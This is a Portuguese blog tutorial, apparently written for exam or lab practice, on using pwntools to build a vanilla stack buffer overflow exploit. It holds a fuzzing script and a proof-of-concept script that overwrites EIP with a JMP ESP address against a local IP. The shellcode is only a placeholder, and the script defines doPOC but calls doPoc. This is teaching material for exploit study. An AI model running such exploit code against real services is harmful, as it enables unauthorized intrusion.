<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
  <meta name="theme-color" content="#FFFFFF">
  <meta property="og:title" content="Usando a pwntools para Binary Exploitation">
    <meta name="description" content="Uma forma de fazer binary exploitation usando a pwntools de forma a facilitar o processo de exploitation">
  <meta property="og:description" content="Uma forma de fazer binary exploitation usando a pwntools de forma a facilitar o processo de exploitation">
    <meta property="og:type" content="blog">
  <title>Usando a pwntools para Binary Exploitation</title>
  <!-- Favicon -->
    <link rel="shortcut icon" href="üìñ">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
  <link rel="stylesheet" type="text/css"
    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
  <link rel="stylesheet" type="text/css" href="css/notablog.css">
  <link rel="stylesheet" type="text/css" href="css/theme.css">
  <style>
    :root {
      font-size: 18px;
    }

    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
    <a href="index.html">
      <div class="Navbar__Btn"><span>üìñ</span> <span>Home</span></div>
    </a>
                                                                                                                            <span class="Navbar__Delim">&centerdot;</span>
    <a href="about.html">
      <div class="Navbar__Btn"><span>‚ÅâÔ∏è</span> <span>About</span></div>
    </a>
                          </nav>
  <header class="Header">
          <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
        <h1 class="Header__Title">Usando a pwntools para Binary Exploitation</h1>
            <div class="DateTagBar">
                <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, Nov 3, 2020</span>
                          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--gray">
            <a href="tag/bof.html">bof</a>
          </span>
                <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
            <a href="tag/osce.html">osce</a>
          </span>
                <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/binary-exploitation.html">binary-exploitation</a>
          </span>
                  </div>
          </header>
      <article id="https://www.notion.so/c2ce4e7ade98405ab7b1a9b1ff072eae" class="PageRoot"><div id="https://www.notion.so/a4a3a5e1054e49e38554f8d02bc85205" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Primeiramente, desculpem os &quot;estrangeirismos aportuguesados&quot; como atachar, dentre outros. Creio que na √°rea, ajuda mais que atrapalha. </em></span></span></p></div><div id="https://www.notion.so/aa1becf5d042493d8a367345918e9498" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/ded07b0af5bc46818b67634cfd50d150" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/ded07b0af5bc46818b67634cfd50d150"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">COME√áANDO QUASE QUE DO COME√áO</span></span></h2><div id="https://www.notion.so/4d5fc0f2232f4b989206506903e52893" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Esse n√£o √© uma explica√ß√£o de como se constr√≥i todo um exploit e tamb√©m n√£o aborda todos os porqu√™s de seguirmos o passo a passo abaixo. √â apenas uma &quot;dica&quot; na utiliza√ß√£o da biblioteca pwntools na constru√ß√£o de exploits para explora√ß√£o de buffer overflow. Estamos aqui tratando de um Buffer Overflow simples do tipo Vanilla.</em></span></span></p></div><div id="https://www.notion.so/7a3a231dfc06491c8de7e44075711ff9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Podemos usar a pwntools para nos ajudar em alguns pontos, como por exemplo: </span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/90ef5bb3fefa41d893a094aaee593dea" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Gerar o pattern e descobrir o offset onde na pilha o valor que vai parar o EIP √© sobreescrito sem precisar recorrer ao msf-pattern_* do metasploit</span></span></li><li id="https://www.notion.so/627210226c504e2683b57ee2d5cc9dd1" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">N√£o precisar inverter bytes para respeitar o little endian</span></span></li><li id="https://www.notion.so/25d7bd5dd3194361a860c39940676c11" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Abstrair a quest√£o de como o python3 tratam as strings diferentemente do python2, o que causa v√°rios problemas na hora do exploitation.</span></span></li></ol><div id="https://www.notion.so/c705ef47b117471187d23fddc534e8c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/Gallopsled/pwntools">pwntools</a></span><span class="SemanticString"> possui muitas e muitas fun√ß√µes, at√© mesmo para fechar conex√£o abstraindo a biblioteca socket. Isso ficar√°, quem sabe, para um pr√≥ximo artigo.</span></span></p></div><div id="https://www.notion.so/10d5436708174403bc0c7a2252e7a6de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/fb295d77cc434046891e125060e8ba29" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed">A id√©ia √© simples: </mark></strong></span><span class="SemanticString">Enviar </span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">j√° na fase de fuzzing</strong></span></span><span class="SemanticString"> um pattern que permita, j√° nesta fase, determinar rapidamente o offset onde vamos conseguir sobrescrever o EIP, ao inv√©s de enviar A&#x27;s para determinar quando vai &quot;estourar&quot; e s√≥ depois construir o pattern para determinar o offset!</span></span></blockquote><blockquote id="https://www.notion.so/424423971fda482a81e94c13809900a1" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Outra id√©ia que n√£o tem a ver com a bilbioteca em si, mas que agiliza, √© logo no primeiro momento quando &quot;atachar&quot; o processo no immunity debbuger, j√° pesquisar pelo endere√ßo do JMP ESP desejado.  </span></span></blockquote><div id="https://www.notion.so/d9a296c0638a42b7b79097e1743fcf3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fb50634ac1264fb083a96be81bfc0adf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Esta proposi√ß√£o n√£o visa substituir a forma did√°tica de aprender sobre o processo usando A&#x27;s, B&#x27;s e C&#x27;S, entendendo bem como os valores v√£o parar na pilha, mas sim avan√ßar um pouco no processo.  </span></span></p></div><div id="https://www.notion.so/2f80b26e1aec479faa85adbeac4444f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Bem, a pwntools tem duas fun√ß√£o que nos ajudar√£o:  </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cyclic(&lt;lenght&gt;)</code></span><span class="SemanticString"> , que serve para gerar padr√µes de tamanho determinado e </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cyclic_find(b&#x27;&lt;padr√£o encontrado&gt;&#x27;)</code></span><span class="SemanticString">, que serve para determinar o offset que desejamos. </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Observe o b antes da string</strong></mark></span><span class="SemanticString">, pois a fun√ß√£o espera uma sequ√™ncia de bytes. </span></span></p></div><div id="https://www.notion.so/160f121be73048119a3da790ca3e2ef8" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-01.png?width=432"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-01.png?width=432" style="width:432px"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">observe que o retorno da fun√ßao cyclic √© um byte array, em conformidade com o esperado para binary exploitation!</span></span></figcaption></figure></div><div id="https://www.notion.so/2237cd9631404e8f8e977912dc20a74b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5cb076d65b034562a274ee3577de11b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Bem, no debuger, quando o fuzzer surtir efeito e &quot;travar&quot; a aplica√ß√£o, o que veremos escrito no EIP √© um valor hexadecimal e n√£o o padr√£o propriamente dito, ou seja, a sua representa√ß√£o hexadecimal. Poder√≠amos &quot;pegar&quot; o valor hexa que est√° em EIP, transformar em caracteres ascii e invert√™-los (lembra do little endian?), mas a id√©ia √© facilitar. </span></span></p></div><div id="https://www.notion.so/0537577a95964475ab626e0d0f729b15" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Neste caso, podemos usar a fun√ß√£o pack(&lt;end_hexa&gt;), para obter o padr√£o desejado. </span></span></p></div><div id="https://www.notion.so/2c01b7435bd840358b3786b98dd1110b" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img2.png?width=576"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img2.png?width=576" style="width:576px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/8fb5c8fcafe74ac29b3dfbb5859431d9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Observe que</strong></mark></span><span class="SemanticString">, usando a pwntools, </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">n√£o precisaremos importar a biblioteca struct, </strong></mark></span><span class="SemanticString">ela j√° possue sua fun√ß√£o pack. Basta pegar o hexa que tem no EIP, colocar dentro da fun√ß√£o pack, passar o resultado para o cyclic_find e Voil√°, offset definido! </span></span></p></div><div id="https://www.notion.so/a70c0f19ea7448f38b37feac35bf42ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/44349cd0dc2440a28a704991527f5d00" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E como ficaria isso no c√≥digo, propriamente dito ? </span></span></p></div><div id="https://www.notion.so/361376d6ed2e432e834935e082eb7ee6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e1f3116ba15446d6a36eb03254cd9450" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">FUZZING</strong></span></span></span></p></div><div id="https://www.notion.so/56151fde536744a09872aba22375a752" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Desta forma passaremos j√° o padr√£o em incrementos de 50 em 50 bytes.</span></span></p></div><pre id="https://www.notion.so/494c33f3df5c4fe9aea18a1c3bef1882" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> sys<span class="token punctuation">,</span> socket
<span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>
host<span class="token operator">=</span><span class="token string">"192.168.1.2"</span>
port<span class="token operator">=</span><span class="token number">8080</span>

<span class="token comment">#Passo 1 - Fuzzing!</span>
<span class="token keyword">def</span> <span class="token function">doFuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      
        <span class="token builtin">buffer</span><span class="token operator">=</span><span class="token string">b"CMD "</span> <span class="token operator">+</span> </span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span>cyclic</span></strong></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span>i<span class="token punctuation">)</span></span></mark></span><span class="SemanticString"><span> <span class="token comment"># de 50 em 50 bytes!</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Sending %d bytes - %s \n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">buffer</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> 
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

doFuzz<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></span></span></code></pre><div id="https://www.notion.so/1dc89161c1a84873b256cbfad6ecfd8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/206afcbebaf048c7ab9a6c189118d249" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ap√≥s o fuzzing podemos j√° capturar o valor que est√° em EIP, que vamos usar para definir o offset que precisamos, </span></span></p></div><div id="https://www.notion.so/d17a8d9cb90d451f9edf207ef1d5dc5d" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-03.png?width=528"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-03.png?width=528" style="width:528px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/44b9590819e14091878fb52c0350e8c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">e o valor do endere√ßo de um jmp esp, atrav√©s do mona.py, que usaremos para direcionar para o EIP.</span></span></p></div><div id="https://www.notion.so/92c8b4a893a4445380c430b20f46c7f9" class="Image Image--Normal"><figure><a href="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-04.png?width=624"><img src="https://raw.githubusercontent.com/diegoalbuquerque/diegoalbuquerque.github.io/master/imgs/pwntools-img-04.png?width=624" style="width:624px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/49f34b5f33104e829bb049899e6f7b39" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Vamos ao POC, j√° que temos tudo, offset e endere√ßo do JMP ESP.</span></span></p></div><div id="https://www.notion.so/ec99516042004d1a990b6af63d2246d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/212ca93e9e9d4f65b8174f3c627361b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">POC  - Offset do EIP definido + Endere√ßo do JMP ESP definido.</strong></span></span></span></p></div><pre id="https://www.notion.so/d90a5848c157475bb7831790042cbc82" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> sys<span class="token punctuation">,</span> socket
<span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>
host<span class="token operator">=</span><span class="token string">"192.168.1.2"</span>
port<span class="token operator">=</span><span class="token number">8080</span>

<span class="token keyword">def</span> <span class="token function">doPOC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

		totalBufferLenght <span class="token operator">=</span> <span class="token number">700</span> <span class="token comment"># valor desejado do buffer total </span>
		
		<span class="token comment"># addressFoundinEIP</span>
		<span class="token comment"># Valor obtido do reg EIP atraves do debug</span>
		<span class="token comment"># quando executado o Fuzzing!</span>
		<span class="token comment"># Observe que √© um padr√£o em Hexa </span>
		<span class="token comment"># print("\x61\x61\x6C\x62") = aalb</span>
		addressFoundinEIP<span class="token operator">=</span><span class="token number">0x61616C62</span>
		
		offsetEIP<span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span>pack<span class="token punctuation">(</span>addressFoundinEIP<span class="token punctuation">)</span><span class="token punctuation">)</span>
		
		
		
		<span class="token comment"># Constru√ß√£o do que vamos enviar para o bin√°rio</span>
		<span class="token comment"># 1. Bytes iniciais quaisquer, neste caso A's, at√© o offset desejado</span>
		bufferInicial<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"CMD "</span> <span class="token operator">+</span> <span class="token string">"A"</span> <span class="token operator">*</span> offsetEIP<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span> 
		
		<span class="token comment"># 2. Valor que desejamos que v√° parar em EIP para que a CPU execute</span>
		<span class="token comment"># um JMP ESP, que ser√° onde estar√° posicionado nosso ShellCode. </span>
		<span class="token comment"># Endere√ßo de um JMP ESP desejado obtido no immunity debug com o comando</span>
		<span class="token comment"># !mona jmp -r ESP -n </span>
		adressToJMPESP <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token number">0x7274146F</span><span class="token punctuation">)</span> 
		
		
		<span class="token comment"># 3. Shellcode propriamente dito. </span>
		<span class="token comment"># Neste ponto, para valida√ß√£o, apenas uma quantidade de C's igual a </span>
		<span class="token comment"># Tamanho total do Buffer que definimos como aceit√°vel para: extrapolar</span>
		<span class="token comment"># o buffer da aplica√ß√£o escrevendo A's + escrever o endere√ßo que desejamos</span>
		<span class="token comment"># que v√° para o EIP + nosso shell code. Neste caso, estimamos um buffer total </span>
		<span class="token comment"># de 700 bytes. Poderia ser mais, poderia ser menos, mas esse foi aceit√°vel.</span>
		lengthShellCode <span class="token operator">=</span> totalBufferLenght <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bufferInicial<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>adressToJMPESP<span class="token punctuation">)</span>  
		shellcode<span class="token operator">=</span> <span class="token string">b'C'</span><span class="token operator">*</span>lengthShellCode <span class="token comment"># </span></span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgYellow"><span>observe o b para indicar byte array!</span></mark></span><span class="SemanticString"><span>
		
		<span class="token builtin">buffer</span><span class="token operator">=</span>bufferInicial<span class="token operator">+</span>adressToJMPESP<span class="token operator">+</span>shellcode
		
		s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
		s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
		s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Sending Exploit %s"</span> <span class="token operator">%</span> <span class="token builtin">buffer</span> <span class="token punctuation">)</span>
		s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

doPoc<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/5d421c1ca264486db1533e6ae8078a67" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a28169127948491a89bdf5905c477ba3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Pronto, agora √© continuar em achar os null bytes, gerar o shell code, explorar e ser feliz! </span></span></p></div><div id="https://www.notion.so/e508c644618f46ba872cc3c09f40db0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Espero que ajude. </span></span></p></div></article>  <footer class="Footer">
        <div>&copy; inDex 2019</div>
        <div>&centerdot;</div>
        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
            rel="noopener noreferrer">Notablog</a>.
        </div>
    </footer>
</body>

</html>